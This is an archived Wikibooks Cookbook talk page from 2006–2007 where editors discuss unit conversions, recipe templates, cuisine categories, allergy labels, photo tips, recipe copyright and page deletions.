Just to jump in here, our current recipe formating policy ([[Cookbook:Policy/Recipe template]]) states: 'Quantities should be listed in whichever system (imperial or metric) the recipe was created in, with the other system's equivalent values listed immediatly after, in &quot;()&quot;. This lets users know which units are &quot;original&quot; and which are estimated conversions.' So, the current policy supports having both systems on a recipe page, while preserving the actual recipes created by our authors. [[User:Gentgeen|Gentgeen]] 10:13, 2 November 2006 (UTC) (I don't think that last bit made much sense, but it's 2:13 AM where I am, so I appologise.)

Thanks everyone.  Yes it all runs automatically with no problems.  A few of the early conversions I did have been added under 'm' for metric rather than under the correct letter in the metric category - I'm working my way through all these to fix them.  All metric measurements if they are conversions will be added in brackets. [[User:Xania|Xania]] 22:01, 5 November 2006 (UTC)

== Recipe template suggestion ==

I noticed that the &quot;recipe template ([[Cookbook:Policy/Recipe template]]) isn't actually a template. I use a few templates on [[A Wikimanual of Gardening]] that can be used with subst: and include other templates within them (see, e.g., {{tl|weedprof}}... you have to open the edit window to see the included templates). Would something like &quot;subst:new recipe&quot; be handy? It might be especially nice for some of the transwikis, which have photos to go in the recipe infobox, etc. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 18:18, 25 October 2006 (UTC)

:I'm pretty sure you can subst any page if you really really want to, e.g. &lt;nowiki&gt;{{subst:Cookbook:Policy/Recipe template}}&lt;/nowiki&gt;. The recipe template as it is now is more of an illustrated guide on how to build a proper recipe page. On the German wikibooks cookbook, they (for some time) had a form which would populate a &quot;new recipe&quot; page with the template (no substing necessary) but it seems to have disappeared. Were we to take a similar approach (subst or not) I would think something much more minimal than the current template would be necessary to avoid lots of blanks and crappy additions. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 19:29, 25 October 2006 (UTC)

::By &quot;the current template&quot; you mean the Policy/Recipe template page? Yes, definitely too much there. The {{tl|weedprof}} one has &quot;invisible instructions&quot; in it that only show up on the edit page to avoid the need to remove things (or keep flipping back and forth to a policy page). Using a name like {{tl|newrecipe}} would be a lot easier than typing that whole thing in, or course :).
::Another variation of that (for the transwikis) could use a form similar to {{tl|twwp-2}}, which is also substituted and adds 3 cleanup tags for 3 different chores. The &quot;find a home&quot; template wouldn't be needed for the cookbook (recipes can be transwikied directly to the cookbook namespace), and the {{tl|newrecipe}} could both add the page structure and the {{tl|cookwork}} message and category. I'm not sure if the dewikify would be useful or not, but the cookwork temp could include a link to [[Wikibooks:Dewikify]] to give people some pointers on that part of the process.--[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 21:16, 25 October 2006 (UTC)

:::If I remember correctly, the &quot;recipe template&quot; predates the creation of the template namespace, and has simply kept its now-confusing name. I'd have no problem renaming it something like [[Cookbook:Policy/Recipe guidelines]]. [[User:Gentgeen|Gentgeen]] 10:19, 2 November 2006 (UTC)

== Major cookbook formatting complete. ==

For the past few months I've been systematically going through [http://en.wikibooks.org/w/index.php?title=Special%3AAllpages&amp;from=&amp;namespace=102 all the cookbook pages] and doing obvious formatting, categorization, deletions and other types of cleanup. Today I have finished! There are still some things that need doing. Specifically:
* Go back over the past 3-4 months of edits in [http://en.wikibooks.org/w/index.php?limit=1000&amp;title=Special%3ARecentchanges&amp;namespace=102 Cookbook recent changes] and patrol/validate what anonymous and new users have changed. (I have done this in the past but have been slacking off)
* Make sure the recipes from the 1881 cookbook, the decameron and the oscookbook are converted and useful, or delete them. ([[Special:Whatlinkshere/Template:1881]], [[Special:Whatlinkshere/Template:Decameron]] and [[Special:Whatlinkshere/Template:Oscookbook]])
* Clean up [[:Category:Cookbook pages needing work]]
* Delete bad/useless [[Cookbook/Redirects|redirects]]
* Clean up all our [[Cookbook:Cuisines]], which are a total mess.

==Ingredients==
I thoughtlessly edited this page when I added the ingredient butter to the ingredient subsection.  I started out by fixing an alphabetic error but then added the link to test something.  In doing so, I had an idea.  When categorizing a recipe, the editor could pick up to three main ingredients by volume or mass.  Or up to three ingredients that best characterize the taste of the dish.  Use these as category items.  For inclusion on Cookbook:Ingredient sub pages limit recipe inclusion to a maximum of those three main items.  If a recipe contains a really unique item that creates a special taste this may be included as well.  With this scheme clicking on an item in the ingredient list would take you to a list of recipes where the ingredient was one of the three main ingredients.  Ingredient pages that have less than three recipes would not be elgible for inclusion on the ingredient subsection of the first page (Cookbook).  Until such time they would have to be included under broader ingredient lists.  The ultimate use of this is allowing you to look up recipes that focus on or use up something you want to highlight or get rid of.  Apologize if discussed in detail in archives or somewhere else.--[[User:Psychofarm|Psychofarm]] 17:58, 2 December 2006 (UTC)

: It's already policy that recipes should be categorized by their major ingredients. If you check out [[:Category:Recipes by ingredient]], you'll see a lot of them. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 21:19, 3 December 2006 (UTC)

==Google Search==
Past archives point to the frustration of not being able to use the searchbox without typing the prefix Cookbook: first.  This month's Wikibook of the month on Nanotechnology, has an external link to a Google search box that specifies to search the Nanotechnology wikibook.  I copied the link and substituted Cookbook and it works!  Could we use it on our introductory page at the top?

=== Idea for beginners: ===
Hey,  For noobie cooks like myself, I think It'd be very useful to list the necessary tools upfront.  In many cases, having the right cooking ware is just as important as the ingredients.

: Some recipes do this, but for all others, simply read the recipe one time through and you should be able to make your own list. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 08:34, 23 December 2006 (UTC)

::I don't know, I think he's got a point. Alton Brown's books always include what he calls a &quot;hardware&quot; list of the tools needed and a &quot;software&quot; list of the ingredients. There might be a &quot;market&quot; for such a layout. [[User:Gentgeen|Gentgeen]] 22:52, 24 December 2006 (UTC)
:::I agree.  I'm no longer a newbie cook, but years ago when I started out I was always thankful that I knew, up-front, which tools I needed.  That way I could buy any lacking equpiment when out shopping for ingredients (or choose a different recipe).  Now when I write recipes for my friends, I always include two lists: Ingredients, and Equipment.  I've always been thanked by my friends for doing so. -- [[User:Jason.C.Daniels|Jason C Daniels]] 21:49, 3 April 2007 (UTC)

::::I think that this is particularly important when a special piece of equipment is needed. I'm sure I've had occasion in the past to actually buy ingredients for a meal, only to find I don't have the necessary tool - leading to a frantic search for a suitable substitute. 
::::That raises another point - suggesting other options, when a specific tool is &quot;required&quot; but not always available. e.g. [[Cookbook:Socca|Socca]] is traditionally cooked on a 50cm copper plaque in a 300°C wood-fired oven; few people have access to either! This recipe suggests how to go about making socca with a lesser oven and a cast iron pan.
::::Having said all that, I don't think we need to alter every recipe so that it has an equipment section, as most are relatively obvious or assume only what is available in &quot;most kitchens&quot;. It would probably be good to add the Equipment section into the [[Cookbook:Policy/Recipe template|recipe template]], though. [[Cookbook:Tempeh|Here's one]] I prepared earlier, which I reckon fits the pattern - comments appreciated, before we go changing the template.

::I wanted to thank Iamunknown for pointing out the Leavening Agents category. Take a look at what I've done there and at [[Cookbook:Leavening Agent]]. The category page now transcludes the content from the Cookbook page, automatically updating both when any new information is added. Additionally, with use of the &lt;nowiki&gt;&lt;noinclude&gt; and &lt;includeonly&gt;&lt;/nowiki&gt; tags, we can choose what part of a cookbook page is displayed in a category. For example, it may be good to include the opening section of [[Cookbook:Beef]] on [[:Category:Beef recipes]], giving some useful prose to the category, and only having it reside at one location. Just some thoughts. [[User:Gentgeen|Gentgeen]] 00:55, 31 December 2006 (UTC)

*[[:Category:Camping recipes]]
I looked all through [http://en.wikibooks.org/wiki/Special:CategoryTree?target=Cookbook&amp;mode=categories&amp;dotree=Show+Tree the Category Tree], but I can't find a category for it.

== Quick and Easy Recipes ==
I think there should be a category for quick and easy recipes. The new Betty-Crocker cookbooks have a section for 20 min recipes. I would like to expand on that idea and classify things as quick and easy. What should the requirements be for this section so it's not so subjective? I was thinking these recipes should be made in under 30-min with (at the most) less 10 ingredients, 5 pots and pans, and 10 steps for preparation. An example that I created is [[Cookbook:Beef Stroganoff]]. This recipe has 6 ingredients and requires 2-3 pots/pans and it can be made in under 15 min in 5 steps. What do you think? [[User:67.181.242.202|67.181.242.202]] 05:08, 29 December 2006 (UTC)

: We have [[:Category:Very Easy recipes]] and [[:Category:Easy recipes]], but perhaps [[:Category:Quick recipes]] is also appropriate. It would be good to do in an automated way, possibly with the recipesummary template, but I forsee lots of formatting problems arising from this. Maybe there could be two attributes, ''totaltimeinminutes'' would determine inclusion in &quot;Quick recipes&quot; if it's under 20 or 30 minutes or whatever, and the current ''time'' attribute, which just displays and can be in greater detail (baking time, prep time, etc all together).

== South Asian cuisines ==

G'day, I was looking at a few recipes from India and Pakistan the other night, and noticed a few things that buggered the bejesus out of me. Not sure which way to proceed, hence my questions now.

We have a category for recipes from this region - [[:Category:South Asian recipes]] - and a page on the cuisines - [[Cookbook:South Asian cuisines]] - and a start has been made on cuisine pages and categories for each of the countries in the region. This is good!

The problem is that the countries in this region have had a complex history resulting in many shared &quot;regional&quot; dishes. Such dishes could be categorised as South Asian, or given multiple categories of Indian recipes / Pakistani recipes / etc. There are pros and cons to both approaches, which is where I arrive at this message.

What brings this all up now is that I did a little patch-up work on [[Cookbook:Makki di roti]], which was evidently transwiki'd from WP where it was categorised as both Indian and Pakistani. Looking at [[Cookbook:Cuisine of Pakistan]], I noticed that most (all?) of the recipes listed there were categorised as Indian, and that there was no [[:Category:Pakistani recipes]] (there is now). 

Now, if one was to categorise, say, [[Cookbook:Aloo gobi|aloo gobi]] as South Asian, because both India and Pakistan claim it, then that would reflect that it is common to many of the countries in the region. However, someone looking for quintessentially Indian curry recipes would be expecting to find it categorised in [[:Category:Indian recipes]] (as it currently is). Which is best?

Worse than that, I believe that there might be some misconceptions in this cookbook as to which recipes are &quot;Indian&quot; and which are (separately or also) &quot;Pakistani&quot;. For example, to my (rather limited) knowledge, [[Cookbook:Dosa]] is commonly made in South India, but not the North, and in the West (and possibly in Pakistan) is made differently as [[w:Dhokla]] (which more closely resembles [[Cookbook:Idli]] but cooked as a single piece - maybe! I've never seen one!) What would be best, of course, would be for people actually familiar with these foods to help categorise them properly. 

OK, these are the problems. So, any suggestions? :) [[User:Webaware|Webaware]] 10:04, 30 December 2006 (UTC)

: A similar problem comes up with [[:Category:Scandanavian recipes]] and [[:Category:Swedish recipes]], for example. I was not able to come up with a good solution for everything. Especially when talking about things like Hummus, which span continents... [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 12:12, 30 December 2006 (UTC)

:: Perhaps I'm being a bit naive, but isn't the solution to put it in all the categories where any ethnic group, state or other geographic/political group can rightly be said to have their own version of it?  From what I've seen of curries, they tend to follow a very similar pattern, regardless if they're from Malaysia, India, North India, Pakistan or even Minnesota (''ok... I'm shamelessly plugging my own skills... I'll stop now'')  Then on the page giving a basic curry recipe that's generally accepted as such by the major players; make notes as to substitutions, proportion changes, techniques, and other spice combinations that are typically used by the various regions known for curry.  I can see the same technique applying to Scandinavian recipes. -- [[User:Jason.C.Daniels|Jason C Daniels]] 22:04, 3 April 2007 (UTC)

:::I pretty much agree, and I've noticed that someone has already started adding &quot;and Pakistan&quot; to some recipes marked as being from India. 
:::Perhaps a recipe should be marked as being from a ''region'' (e.g. South Asia, the Middle East) when it is broadly known across that region, and from countries ''X'', ''Y'', ''Z'' when just a couple of countries may lay claim to it.

== Photography ==

I've submitted some bad photos of food to this book before.  While mine is the only photo of [[Cookbook:Jambalaya|jambalaya]], it was rightly moved to a footnote.  

I found this [http://www.shutterbug.com/features/1204insider/ article] on food photography interesting; perhaps someone can condense these tips for use by cookbook contributors?  For example, I know if I ever try for another Jambalaya picture, I'll use better light, raw celery painted with glycerin, and a better-looking bowl &amp; place setting. --[[User:Polyparadigm|Polyparadigm]] 05:29, 6 January 2007 (UTC)

: Looking at the edit history your image was moved because it was for a variation rather than the &quot;normal&quot; recipe. You could move it back (maybe put it in a recipesummary template) without any ill effects or will by anybody I'd imagine.

: As for taking photos the best I can offer is (if you intend to eat the food in addition to photographing it) is to take photos near a window or outside to get appropriately bright lighting. Unfortunately this doesn't work so well for things you've just made for dinner or dessert... a friend of mine built a light box for just this purpose.

== Units templates ==

I have been working on some template solutions that will automatically convert between metric/American measurement units. I would like to take some of the templates in use here on the cookbook (such as {{tl|Kg}}, or {{tl|g}}) and rewrite them to use this conversion process. At the moment, these templates only serve as links to pages in the cookbook that explain the different units. If people don't object to this change, I would like to get to work on it early this week. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 03:29, 16 January 2007 (UTC)
:Sounds good, in principle. However, I would like to make the following points about unit conversions in recipes:
:* recipes aren't engineering &amp;ndash; precision is generally undesirable and can be distracting, e.g.
:** 300°F → 150°C, not 148.9°C
:** 1 lb → 450g or even ½kg, not 453.6g (and conversely, 1kg might be better converted to 2lb, not 2.2lb)
:** 1 pint (US) → 500ml or half a litre generally, unless 470ml is somehow critical
:* most mixes of flour and water need not be precise, as the cook will need to add extra flour or water to get the correct consistency for their ingredients and weather conditions
:* I wouldn't bother converting things like cups, teaspoons and tablespoons, as they are relative terms and will normally scale well with the cook (e.g. 1 cup could be 200ml, 225ml, 250ml, but 2 cups is twice whatever 1 cup is, and ½ cup is half of whatever 1 cup is)
:* watch out for imperial vs Queen Anne (US) liquid measures:
:** 1 pint (US) → 470ml, but 1 pint (UK) → 570ml
:[[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 07:08, 16 January 2007 (UTC)
::Oh yes, and: it's very important to leave the originally specified quantities in place, as cultural context can matter! I recently saw a recipe that had been &quot;fixed&quot; to say ''30ml of soy sauce'', when the original text said ''a few tablespoons'' &amp;ndash; clearly a rough (and variable) measure by taste, not a precisely measured quantity. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 07:14, 16 January 2007 (UTC)
:::Have to say that I completely agree with Webaware - recipes do not make for easy conversion candidates.  Taking bread as an example recipes will frequently say that such conversion is unwise and likely to lead to results that may not be satisfactory.  I see it as desirable in some areas but in the case of Cookbook: caution is required --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 07:45, 16 January 2007 (UTC)

:In answer to many of the criticisms listed above, I do agree with these points. Due to the round-off errors inherent in computer arithmetic, there will undoubtably be problems in converting between systems. For instance, &quot;1.973 cups&quot; will only cause problems if the number is intended to be &quot;2 cups&quot;. having a long decimal, such as &quot;1.989991292 cups&quot; will be even worse. My intention is not to use these templates in the cookbook itself. Most of these templates, such as {{tl|Kg}}, and {{tl|g}} are not used to show conversions or equivalencies, but they are instead used to provide links to cookbook pages that contain rough tables of these equivalencies. My point here is that the templates can be removed and replaced with the necessary links (a small task, considering these templates are only used in a handful of cookbook pages), and that the templates can then be used for other things completely external to the cookbook. In essence, I'm asking the cookbook to &quot;donate&quot; these templates to the greater wikibooks' community for use elsewhere.--[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 14:48, 16 January 2007 (UTC)

== Non-English cooking term translations ==

G'day, I've just lobbed in a bunch of Indian-to-Cookbook translations, currently just some common spices and veges. For want of a better home, I put them on the bottom of [[Cookbook:Cuisine of India]]. I reckon that it would be a useful thing to build up, particularly as some of the recipes coming into the Cookbook recently have had Hindi and Tamil names for stuff like cumin and chickpeas, thus frustrating the effort to wikify them. 

However, such a list could get pretty big, pretty quickly. What is there now is just what I could be bothered banging out pretty quickly this arvo; I haven't even touched fruits and meats, for example. Whereas it seemed that the Cuisine page was the right place, I reckon it deserves its own page. Can I possibly abdicate responsibility for naming this new page? And while we're about it, are there other cuisines that could do with similar treatment? And yes, I know that we already have [[Cookbook:International food terms]], but that really isn't the same thing, IMHO. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 08:44, 17 January 2007 (UTC)

: Redirects for each of these to the english-name ingredient is probably appropriate, since the Indian dishes seem to mix both the hindi/tamil and english ingredient names. I think having these on [[Cookbook:Cuisine of India]] is fine, maybe transcluding or linking it to the international food items page might also be warranted. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 18:43, 17 January 2007 (UTC)

::I like the idea about the redirects. However, the non-English names are often Romanised differently (e.g. v often as w, g as k or kk, and so forth) plus some names use short and longer forms interchangeably (e.g. coriander seed: coriander = kothamalli in Tamil, the seed may be kothamalli or kothamalli virai, or even varakothamalli, and the leaf (cilantro to them in the Americas) could equally be kothamalli or kothamalli ilai). I guess that we could try to cover all spellings, but that would be difficult - hence the list, so we can pick the name that it looks most like :)

::I'll leave it all there on the Cuisine page for now, and make a link on the International food terms page. cheers, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 23:30, 17 January 2007 (UTC)

== Scalability ==

How are you going to decide on what adjectives to use to modify &quot;recipes&quot; when you're dealing with countries like Côte d'Ivoire? Is there even an adjective for that example? And what is it? --[[User:Iamunknown|Iamunknown]] 00:35, 21 January 2007 (UTC)

== User rating of recipes ==

G'day, [[User:Frankatca|Frankatca]] raised a point in the [[Wikibooks:Staff lounge#Transwiki|Staff lounge]] about having some sort of user rating for recipes, ''a la'' Amazon book reviews. I know that we can already add comments on the discussion pages (and some readers already have), but I'm wondering if we could somehow direct people to rate recipes they've tried out, in a standardised way. I haven't thought this through (can't think too clearly today)  but perhaps a template to stick on the recipe page, which presents a &quot;click here to rate&quot; link that lets a user pick a 1-5 rating and type in a rating comment. Perhaps ratings could be stored in a sub-page of the recipe in a standard format, rather than loosely on the discussion page, thus making it easier to keep track of ratings versus recipe / editing discussions. I dunno, brain only partially working here... what do y'all think? [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 08:12, 5 February 2007 (UTC)

: There's no easy way to do this with mediawiki software and it might not jive with NPOV things. This is something that has come up repeatedly, but is not done obviously in any way on a wiki. Also, the cookbook shouldn't be seen as a &quot;community recipes&quot; site but as a reference book. Rating isn't really appropriate.

== Allergy  infoboxes? ==

Hi,

As a reader of cookbook recipes, it would be appreciated if some kind
of info-box for allergy information was included on some recipes.

The common allergies being gluten, dairy and nuts...

If it were extended to include 'dietary' advisories then you
could also state if a recipe was vegetarian friendly..

[[User:ShakespeareFan00|ShakespeareFan00]] 17:54, 12 February 2007 (UTC)

: The diet-related bits ([[:Category:Vegan recipes]], [[:Category:Vegetarian recipes]], [[:Category:Gluten-free recipes]]) are handled by categories, as for nut or dairy allergies, I don't think we currently have categories for these, but I'm not sure anyone will ever care to make them. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 15:22, 13 February 2007 (UTC)

::Additionally, I reckon it would be pretty complex to properly cover this - what about salicylates, biogenic amines, gluten intolerance (not allergy) vs wheat allergy, shellfish vs seafood allergies vs iodine intolerance, &quot;dairy&quot; vs lactose intolerance vs casein intolerance, peanuts vs cashew nuts vs true nut allergies, nightshade group vegetables/fruit (potatoes, tomatoes, capsicum family, etc.), allium family intolerances vs onion allergy &amp;ndash; a box that marked recipes as &quot;safe&quot; would be bigger than the recipe. People with intolerances and allergies should be aware of the ingredients that are problematic for them, and avoid or modify recipes accordingly. I think that the category approach is best, for now at least. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 22:11, 13 February 2007 (UTC)
:::I actually thought this was a good idea but reading Webaware I think I agree (happens sometimes!).  Equally in a litigious (sp) world the opportunities for &quot;I tried this recipes for nut casserole but it didn't warn me there were nuts in and I'm allergic&quot; are endless (or is it only UK labelling that contains such things!) --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 08:22, 14 February 2007 (UTC)
::Concerning allergies, I think the best thing you could do is to post a general allergy warning at the beginning of the book, such as &quot;if you have a food allergy, read the ingredients list before you cook or eat any of this food&quot;. Because people who are allergic to something like nuts or dairy are likely to be taking some kind of precautions against eating those things, or else they would not be healthy enough to read our cookbook in the first place. A warning template here or there (&quot;This recipe contains dairy products&quot;) might be the most you could do, without having to warn about every possible allergy/intolerance that people might have to food. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 11:54, 14 February 2007 (UTC)
::: Hmm, anyone want to put make standard tages for this, so that I can tag recipes acfcordingly?
::: Or even a general allergy warning suggesting people check the ingredients list as suggested above?
::: [[User:ShakespeareFan00|ShakespeareFan00]] 15:48, 14 March 2007 (UTC)

::::I'm not so sure about this. It sounds reasonable at first blush, as recipes for cream pies could be labelled with a warning about dairy in case a dairy-intolerant person is too ignorant of their own limitations to realise that cream is dairy. However, it could also be problematic, e.g. where a recipe blends milk ''or other liquids'' with the other ingredients, milk being used for a &quot;richer&quot; version but plain old water being used for a &quot;less rich&quot; version. Milk can also be substituted for by soy milk, oat milk, rice milk, ... should we deter the lactose or casein intolerant just because a recipe as written contains an ingredient that they can substitute something else for?
::::If the purpose is to provide legal coverage, then a standard book-wide disclaimer should suffice. Anything more would likely provide holes in the legal defence, unless we are all ''very diligent'' at tagging all recipes with ingredients that may harm ''someone'' (an impossible task, I would submit).
::::If the purpose is to inform the reader that a recipe is or is not safe for them to use, as written, then I would submit that an ''inclusive'' approach would be better than an ''exclusive'' approach. Tagging recipes as being ''unsafe'' because they have, say, dairy ingredients, marks them as undesirable, and could deter someone from modifying such recipes to suit their needs. Tagging recipes as being &quot;dairy free&quot;, &quot;gluten free&quot;, etc. is ''inclusive'' as it says the the recipe, as written, can be used unmodified for people affected by the specified problematic food. Putting recipes into categories already meets the ''inclusive'' approach, but if you feel strongly about pretty buttons, perhaps you could design templates for &quot;Dairy Free&quot;, &quot;Gluten Free&quot;, &quot;No Nuts&quot; etc.
::::Just my take on this, based on my personal assumption that anyone cooking food would know not to toss in an ingredient that their system can't tolerate. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 05:30, 15 March 2007 (UTC)
:::::Agreed. As a person who loves to cook and who has gastrointestinal issues which results in '''numerous food sensitivities''' -- well beyond what's been discussed here -- I would hate a warning being slapped on recipes.  In short if you've got problems with some sorts of foods, either you're making yourself suffer already unknowing, or you're already actively avoiding the problem foods.  I think the motivation for this comes from the labeling that the food processing industry has to do.  They share equipment for different products.  If such a product is a common allergen, or severe allergen, then they must label their food as being processed with equipment shared with  peanuts -- for example.  And for those that have it as an ingredient, well, ingredient lists on boxes are so tiny, so that it's easy to miss a potential allergen item when reading it.  Now contrast that with preparing the food yourself.  If you missed the known allergen ingredient when reading the ingredient list, you probably didn't buy, handle, or use the problem food when making the recipe.  This of course only applies to foods that are made only from base ingredients. (i.e. shellfish, peanuts ...etc)  If a recipe contains a candy bar which is laced with peanut butter, it might be useful to know that before going to the store... BUT... If you're allergic to peanuts you should look up that candy bar online to get it's ingredient list. Just to be safe.  
:::::''As I'm babbling here, I realized perhaps whats warranted is a general guideline page for basic safe cooking tips.  Assuming a large population of newbies to the hobby of cooking it seems that listing more than just how to be aware of potential allergens in foods is a good idea.  We could include basic safety tips such as how to put out a grease fire. (Use a powder based extinguisher, baking soda lacking the extinguisher, sand or dirt from outside failing that... BUT NEVER USE WATER!)''  I hope my pain-med induced ramblings are well received. -- [[User:Jason.C.Daniels|Jason C Daniels]] 22:39, 3 April 2007 (UTC)

I'm still not so sure about the 3 remaining links, however, as they are generically to recipe collections (as compared to specifically to information on eating or cooking vegan meals), and were likely to attract more of the same. As such, I've removed them too. If you have specific pages from these sites pertaining to vegan cuisine (other than just as another bunch of recipes easily found with a Google search), perhaps you could add them back. cheers, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 06:17, 23 March 2007 (UTC)

::: There are unfortunately not many websites on basic (vegan-specific) cooking techniques.

Seems that [[Cookbook:Vegetarian cuisine]] has the same problem. I'll remove them all unless someone vets  them before Friday (Aussie time, means Thursday in some places).

== Copyright issues ==

(These are copied from Herby's talk page - there is a link there to this but this is the correct place for such discussion IMO)

&quot;Hi - the recipes that you have added all look as though they come from a website ([1]) which has a copyright statement at the bottom of each page. If that is the case these will all have to be deleted as we cannot accept copyright materials here. Thanks --Herby talk thyme 16:58, 22 March 2007 (UTC)&quot;

Hi Herby,

Thanks for your comments about the copyright infringement, however i have permission from the Videojug website to use the content on their pages. I was actually told by a Wikipedia administrator (i know you're not totally associated with them!) that i could add pages to this website. The videojug website is actually a free resource for your users if they wish to get redirected to our website. Can you please let me know if adding material to your website is still ok. I believe that my content is valuable to the visitors at Wikibooks- so i really would like it to stay on your pages. Please can you reply as to the next stages, as i would like to add some more material (sparsely) but obviously it is quite time consuming! Thanks for the warning. Robert

''Thanks for the message - as far as I am aware without specific written permission from the owners of the website t the Wikimedia foundation it would not be possible to host these pages as they are absolute copies. Please look at Wikibooks:Copyrights and then maybe Help:Boilerplate request for permission. I would also like a pointer to where you were given permission on Wikipedia to use the material and the admin's name - copyright policy is the same across all Wikimedia projects. Thanks --Herby talk thyme 09:48, 23 March 2007 (UTC)

I actually work for the organisation concerned, so i do have written permission from the website owner (in fact he is about five metres from me). If you would like me to change a few of these pages so they aren't absolute copies i can do that. The following extract came from Kariteh in the Wikipedia team. Hope that this is acceptable, and we can continue with this.

&quot;This is the reason why the sister project Wikibooks has been created. Wikibooks is a collection of free &quot;books&quot; and annotated texts that are written collaboratively by anyone. While tutorials, guides, recipes, how-tos, etc. do not belong on Wikipedia, they are definively at home on Wikibooks. When people want to look for encyclopedic contents, they look here; when they look for how-tos, they look on Wikibooks. So you might want to check that project; there are a lot of other recipes there and yours would definitively be welcome. As a matter of fact, contents which are inapropriate for Wikipedia can often be moved to Wikibooks instead of being simply deleted or reverted&quot;. &quot;So, as a conclusion, I hope you understand Wikipedia's reasonings and guidelines better now. Again, while recipes are not appropriate for an encyclopedia, they definitely are for Wikipedia's sister project Wikibooks&quot;. Kariteh 18:36, 21 March 2007 (UTC)

Ok- Thanks for your help on this matter. I won't add any more content to your pages until a decision has been made. However i would like to add that any external link coming from your site is predominantly promoting some product i.e. taking you away from your site to theirs/ another. We also do not sell any products on our site! I hope that an agreement can be reached. Thanks again for understanding and trying to get to the bottom of it before deleting the appropriate content. Hope we can resolve this soon.

:Hope I'm not intruding here... In the US, apparently, recipes are deemed facts and thus are not copyrightable. I can get the reference if you need it. [[User:Chazz|Chazz]] &lt;small&gt;([[User talk:Chazz|talk]])&lt;/small&gt; 21:00, 24 March 2007 (UTC)

::I'll happily intrude also! US law does allow a list of ingredients, but a recipe is generally more than that. Where the recipe includes a description of the procedure or of the meal itself, it is subject to copyright law. [http://www.copyright.gov/fls/fl122.html] [http://www.washingtonpost.com/wp-dyn/content/article/2006/01/03/AR2006010300316.html] [http://recipes.egullet.org/copyright.php]

A very good discussion of copyright with respect to recipes can be found [http://smallbusiness.findlaw.com/copyright/copyright-realworld/recipe-copyrighting.html on findlaw]:
: The short answer is that a single recipe is unlikely to receive much, if any, copyright protection, and a collection of recipes will be protected in its creative aspects, but less protected as to the specific ingredients and steps required to prepare a given dish. An author or cook considering publishing his or her recipes should approach the subject carefully.

:Yes, an interesting discussion, which I read as &quot;don't rely on copyright protection of your recipes&quot;. This is not quite the same thing as saying that copyright law does not apply to recipes; it does, but courts in the USA are wary of prosecuting violations of recipe copyrights due to technical complications. We should not take that as an invitation to allow breaches of copyright here in Wikibooks, however.

== Deletions ==

I want to delete the following for being variously horrible or unnecessary.
* &lt;s&gt;[[Cookbook:Chicken Riggies]]&lt;/s&gt;
* &lt;s&gt;[[Cookbook:Chicken Rice Salad]]&lt;/s&gt; - needs procedure (probably just chop chop)
* [[Cookbook:Carrots cooked kinpira style]] - no measurements
**Now has measurements. (Webaware)
* [[Cookbook:Creme_Anglaise/trial]] - test page?
**Delete as test page, probably of old attempts at {{tl|recipesummary}} (Webaware)
* &lt;s&gt;[[Cookbook:Creamy_Delight_Smoothie]]&lt;/s&gt;
* &lt;s&gt;[[Cookbook:Easy_Orange_Smoothie]]&lt;/s&gt;
* [[Cookbook:Ethics]] - dumb, POV
** Not keen on this but would like to see it done properly (Herby)
**Yeah, very POV - could it be copyedited to more neutral language without losing some of its points? Some of them actually are valid considerations, albeit perhaps not for a cookbook. I dunno. See what others have to say about it. (Webaware)
